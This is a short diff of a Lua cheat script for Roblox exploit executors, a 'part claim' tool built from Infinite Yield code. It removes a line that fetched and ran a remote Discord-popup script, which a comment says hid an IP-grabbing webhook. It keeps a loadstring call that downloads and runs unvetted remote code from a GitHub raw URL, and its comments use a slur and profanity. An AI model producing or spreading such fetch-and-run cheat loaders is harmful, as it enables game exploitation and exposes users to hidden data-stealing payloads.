@@ -1,10 +1,9 @@
 -- IMPROVED WITH PART CLAIM!!!
--- OFFICALLY BACK NOW!!! :D
--- you can use the src code, please just leave our discord invite somewhere :)
 -- MOST OF THIS CODE IS FROM INFINITE YIELD TPUA COMMAND
 pcall(function()
 print("script working!!")
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hellohellohell012321/discordpopup/main/discord-popup.lua",true))() -- discord invite
+-- discord invite removed because it was made by a retarded skid who decided to add a webhook.
+-- fuck ip grabbing skids
 loadstring(game:HttpGet("https://raw.githubusercontent.com/evilionx3/new-scripts/refs/heads/main/partclaim.lua"))() -- if you remove this it becomes less strong
 local G2L = {}
 G2L["1"] = Instance.new("ScreenGui", game:GetService("CoreGui"))
